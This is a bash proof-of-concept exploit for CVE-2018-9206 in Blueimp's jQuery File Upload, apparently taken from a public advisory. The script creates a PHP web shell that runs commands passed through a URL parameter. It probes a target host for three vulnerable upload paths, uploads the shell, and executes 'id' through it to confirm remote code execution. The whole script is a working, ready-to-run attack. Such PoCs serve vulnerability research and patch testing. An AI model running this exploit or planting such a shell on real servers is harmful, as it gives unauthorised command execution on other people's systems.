#!/bin/bash 
#PoC for CVE-2018-9206
#http://www.vapidlabs.com/advisory.php?v=204
#Larry W Cashdollar

USERAGENT="\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36\""

PATHS=("jQuery-File-Upload/server/php/upload.class.php" "jQuery-File-Upload/example/upload.php" "jQuery-File-Upload/server/php/UploadHandler.php")

CURL=`which curl`
JQ=`which jq`

if [ -z $CURL ]; then
	echo "Please install curl."
	echo "# apt-get install curl"
	exit
fi

if [ -z $JQ ]; then
	echo "Please install jq."
	echo "# apt-get install jq"
	exit
fi

if [ -z $1 ]; then
	echo "Please supply a target host as an argument."
	echo "$0 www.example.com"
	exit
fi

INDEX=-1

echo "<?php system(\$_GET['cmd']); ?>" > shell.php
echo  "________________________________________________________________________________"
echo  "|PoC Exploit for Blueimp's jQuery File Uploader CVE-2018-9206"
echo  "|Checks for older versions of the code and upload a shell file."
echo  "|Larry W. Cashdollar"
echo  "---/"
echo
echo
echo  "[+] Checking variations :"

for x in ${PATHS[@]}; do
        echo "Testing... -> $1/$x\n"
	OUTPUT=`curl -sk -D -A $USERAGENT --head "$1/$x"|grep 200`
if [ -n "$OUTPUT" ]; then
	echo "[+] Found Path: $x\n"
	INDEX=$(($INDEX+1))
	break;
fi;
INDEX=$(($INDEX+1))
done


if [ $INDEX -eq "0" ]; then
	echo "[+] Running curl  -F  \"files[]=@shell.php\" -F \"filename=shell.php\" \"$1/jQuery-File-Upload/server/php/index.php\""
	$CURL  -F  "files[]=@shell.php" -F "filename=shell.php" "$1/jQuery-File-Upload/server/php/index.php" | jq "."
	echo
	echo "[+] Testing Shell with: curl $1/jQuery-File-Upload/server/php/files/shell.php?cmd=id"
	$CURL $1/jQuery-File-Upload/server/php/files/shell.php?cmd=id
fi
if [ $INDEX -eq "1" ]; then
	echo "[+] Running curl  -F  files[]=@shell.php -F filename=shell.php $1/jQuery-File-Upload/example/upload.php"
	$CURL  -F  "files[]=@shell.php" -F "filename=shell.php" "$1/jQuery-File-Upload/example/upload.php" | jq "."
	echo
	echo "[+] Testing Shell with: curl $1/jQuery-File-Upload/example/files/shell.php?cmd=id"
	$CURL $1/jQuery-File-Upload/example/files/shell.php?cmd=id
fi
if [ $INDEX -eq "2" ]; then
	echo "[+] Running curl  -F  \"files[]=@shell.php\" -F \"filename=shell.php\" \"$1/jQuery-File-Upload/server/php/index.php\""
	$CURL  -F  "files[]=@shell.php" -F "filename=shell.php" "$1/jQuery-File-Upload/server/php/index.php" | jq "."
	echo
	echo "[+] Testing Shell with: curl $1/jQuery-File-Upload/server/php/files/shell.php?cmd=id"
	$CURL $1/jQuery-File-Upload/server/php/files/shell.php?cmd=id
fi
